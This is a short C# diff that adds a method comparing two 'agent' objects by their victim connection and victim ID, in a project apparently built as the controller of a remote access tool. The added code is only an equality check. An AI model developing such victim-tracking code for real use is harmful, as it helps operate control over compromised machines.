@@ -35,6 +35,11 @@ namespace EgoDrop
             return v1.m_sktClnt == v2.m_sktClnt;
         }
 
+        public static bool fnbSameAgent(clsAgent agent1, clsAgent agent2)
+        {
+            return fnbSameVictim(agent1.m_victim, agent2.m_victim) && string.Equals(agent1.m_szVictimID, agent2.m_szVictimID);
+        }
+
         /// <summary>
         /// Find opened window form with agent.
         /// </summary>
